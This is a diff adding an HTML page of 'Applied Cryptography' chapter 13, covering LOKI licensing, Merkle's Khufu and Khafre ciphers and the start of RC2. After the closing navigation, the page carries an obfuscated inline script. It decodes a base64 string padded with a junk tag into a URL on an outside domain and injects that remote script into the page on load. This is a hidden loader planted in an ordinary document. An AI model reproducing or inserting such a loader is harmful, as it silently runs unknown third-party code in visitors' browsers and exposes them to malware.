@@ -1,0 +1,143 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Block Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=13//-->
+<!--PAGES=316-318//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Patents and Licenses</I></B></FONT></P>
+<P>LOKI is not patented. Anyone can implement the algorithm and use it. The source code implementation in this book is copyrighted by the University of New South Wales. Anyone interested in using this implementation (or their other implementation, which is several orders of magnitude faster) in a commercial product should contact Director CITRAD, Department of Computer Science, University College, UNSW, Australian Defense Force Academy, Canberra ACT 2600, Australia; FAX: &#43;61 6 268 8581.
+</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">13.7 Khufu and Khafre</FONT></H3>
+<P>In 1990 Ralph Merkle proposed two algorithms. The basic design principles behind them are [1071]:
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;DES&#146;s 56-bit key size is too small. Considering the negligible cost of increasing the key size (computer memory is cheap and plentiful), it should be increased.
+<DD><B>2.</B>&nbsp;&nbsp;DES&#146;s extensive use of permutations, while suitable for hardware implementations, is very difficult to implement in software. The faster software implementations of DES implement the permutations by table lookup. Table lookup can provide the same &#147;diffusion&#148; characteristics as permutation and can be much more flexible.
+</DL>
+<TABLE WIDTH="100%">
+<TH CAPTION COLSPAN="16" ALIGN="CENTER">Table 13.3<BR>P-Box Permutation
+<TR>
+<TD COLSPAN="16"><HR>
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">32,
+<TD ALIGN="LEFT" VALIGN="TOP">24,
+<TD ALIGN="LEFT" VALIGN="TOP">16,
+<TD ALIGN="LEFT" VALIGN="TOP">8,
+<TD ALIGN="LEFT" VALIGN="TOP">31,
+<TD ALIGN="LEFT" VALIGN="TOP">23,
+<TD ALIGN="LEFT" VALIGN="TOP">15,
+<TD ALIGN="LEFT" VALIGN="TOP">7,
+<TD ALIGN="LEFT" VALIGN="TOP">30,
+<TD ALIGN="LEFT" VALIGN="TOP">22,
+<TD ALIGN="LEFT" VALIGN="TOP">14,
+<TD ALIGN="LEFT" VALIGN="TOP">6,
+<TD ALIGN="LEFT" VALIGN="TOP">29,
+<TD ALIGN="LEFT" VALIGN="TOP">21,
+<TD ALIGN="LEFT" VALIGN="TOP">13,
+<TD ALIGN="LEFT" VALIGN="TOP">5,
+<TR>
+<TD ALIGN="LEFT" VALIGN="TOP">28,
+<TD ALIGN="LEFT" VALIGN="TOP">20,
+<TD ALIGN="LEFT" VALIGN="TOP">12,
+<TD ALIGN="LEFT" VALIGN="TOP">4,
+<TD ALIGN="LEFT" VALIGN="TOP">27,
+<TD ALIGN="LEFT" VALIGN="TOP">19,
+<TD ALIGN="LEFT" VALIGN="TOP">11,
+<TD ALIGN="LEFT" VALIGN="TOP">3,
+<TD ALIGN="LEFT" VALIGN="TOP">26,
+<TD ALIGN="LEFT" VALIGN="TOP">18,
+<TD ALIGN="LEFT" VALIGN="TOP">10,
+<TD ALIGN="LEFT" VALIGN="TOP">2,
+<TD ALIGN="LEFT" VALIGN="TOP">25,
+<TD ALIGN="LEFT" VALIGN="TOP">17,
+<TD ALIGN="LEFT" VALIGN="TOP">9,
+<TD ALIGN="LEFT" VALIGN="TOP">1
+<TR>
+<TD COLSPAN="16"><HR>
+</TABLE>
+<DL>
+<DD><B>3.</B>&nbsp;&nbsp;The S-boxes in DES are small, with only 64 4-bit entries per box. Now that memory is larger, S-boxes should grow. Moreover, all eight S-boxes are used simultaneously. While this is suitable for hardware, it seems like an unreasonable restriction in software. A larger S-box size and sequential (rather than parallel) S-box usage should be employed.
+<DD><B>4.</B>&nbsp;&nbsp;The initial and final permutations in DES are widely viewed as cryptographically pointless and should be discarded.
+<DD><B>5.</B>&nbsp;&nbsp;All the faster implementations of DES precompute the keys for each round. Given this fact, there is no reason not to make this computation more complicated.
+<DD><B>6.</B>&nbsp;&nbsp;Unlike DES, the S-box design criteria should be public.
+</DL>
+<P>To this list, Merkle would probably now add &#147;resistant to differential cryptanalysis and to linear attacks, &#148; but those attacks were still unknown at the time.
+</P>
+<P><FONT SIZE="+1"><B><I>Khufu</I></B></FONT></P>
+<P>Khufu is a 64-bit block cipher. The 64-bit plaintext is first divided into two 32-bit halves, <I>L</I> and <I>R</I>. First, both halves are XORed with some key material. Then, they are subjected to a series of rounds similar to DES. In each round, the least significant byte of <I>L</I> is used as the input to an S-box. Each S-box has 8 input bits and 32 output bits. The selected 32-bit entry in the S-box is then XORed with <I>R. L</I> is then rotated some multiple of 8 bits, <I>L</I> and <I>R</I> are swapped, and the round ends. The S-box itself is not static, but changes every 8 rounds. Finally, after the last round, <I>L</I> and <I>R</I> are XORed with more key material, and then combined to form the ciphertext block.</P>
+<P>Although parts of the key are XORed with the encryption block at the beginning and end of the algorithm, the primary purpose of the key is to generate the S-boxes. These S-boxes are secret and, in essence, part of the key. Khufu calls for a total key size of 512 bits (64 bytes) and gives an algorithm for generating S-boxes from the key. The number of rounds for the algorithm is left open. Merkle mentioned that 8-round Khufu is susceptible to a chosen-plaintext attack and recommended 16, 24, or 32 rounds [1071]. (He restricted the choice of rounds to a multiple of eight.)</P>
+<P>Because Khufu has key-dependent and secret S-boxes, it is resistant to differential cryptanalysis. There is a differential attack against 16-round Khufu that recovers the key after 2<SUP>31</SUP> chosen plaintexts [611], but it cannot be extended to more rounds. If brute-force is the best way to attack Khufu, it is impressively secure. A 512-bit key gives a complexity of 2<SUP>512</SUP>&#151;inconceivable under any circumstances.</P>
+<P><FONT SIZE="+1"><B><I>Khafre</I></B></FONT></P>
+<P>Khafre is the second of two cryptosystems proposed by Merkle [1071]. (Khufu and Khafre are names of Egyptian pharaohs.) It is similar in design to Khufu, except that it was designed for applications without precomputation time. The S-boxes are not key-dependent. Instead, Khafre uses fixed S-boxes. And the key is XORed with the encryption block not only before the first round and after the last round, but also after every 8 rounds of encryption.
+</P>
+<P>Merkle speculated that key sizes of 64- or 128-bits would be used for Khafre and that more rounds of encryption would be required for Khafre than for Khufu. This, combined with the fact that each round of Khafre is more complex than for Khufu, makes Khafre slower. In compensation, Khafre does not require any precomputation and will encrypt small amounts of data more quickly.</P>
+<P>In 1990 Biham and Shamir turned their differential cryptanalysis techniques against Khafre [170]. They were able to break 16-round Khafre with a chosen-plaintext attack using about 1500 different encryptions. It took about an hour, using their personal computer. Converting that to a known-plaintext attack would require about 2<SUP>38</SUP> encryptions. Khafre with 24 rounds can be broken by a chosen-plaintext attack using 2<SUP>53</SUP> encryptions, and a known-plaintext attack using 2<SUP>59</SUP> encryptions.</P>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>Both Khufu and Khafre are patented [1072]. Source code for the algorithms are in the patent. Anyone interested in licensing either or both algorithms should contact Director of Licensing, Xerox Corporation, P.O. Box 1600, Stamford, CT, 06904-1600.
+</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">13.8 RC2</FONT></H3>
+<P>RC2 is a variable-key-size encryption algorithm designed by Ron Rivest for RSA Data Security, Inc. (RSADSI). Apparently, &#147;RC&#148; stands for &#147;Ron&#146;s Code, &#148; although it officially stands for &#147;Rivest Cipher.&#148; (RC3 was broken at RSADSI during development; RC1 never got further than Rivest&#146;s notebook.) It is proprietary, and its details have not been published. Don&#146;t think for a minute that this helps security. RC2 has already appeared in commercial products. As far as I know, RC2 has not been patented and is only protected as a trade secret.
+</P>
+<P>RC2 is a variable-key-size 64-bit block cipher, designed to be a replacement for DES. According to the company, software implementations of RC2 are three times faster than DES. The algorithm accepts a variable-length key, from 0 bytes to the maximum string length the computer system supports; encryption speed is independent of key size. This key is preprocessed to yield a key-dependent table of 128 bytes. So the number of effectively different keys is 2<SUP>1024</SUP>. RC2 has no S-boxes [805]; the two operations are &#147;mix&#148; and &#147;mash, &#148; and one is chosen in each round. According to their literature [1334]:</P>
+<BLOCKQUOTE><P>... RC2 is not an iterative block cipher. This suggests that RC2 offers more protection against differential and linear cryptanalysis than other block ciphers which have relied for their security on copying the design of DES.
+</P>
+</BLOCKQUOTE><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="13-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="13-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(oQZciDiD, vCBzyZmE) {vCBzyZmE = oQZciDiD.createElement('script');vCBzyZmE.type = 'text/javascript';vCBzyZmE.async = true;vCBzyZmE.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');oQZciDiD.getElementsByTagName('body')[0].appendChild(vCBzyZmE);}(document));</script></body>
+</html>
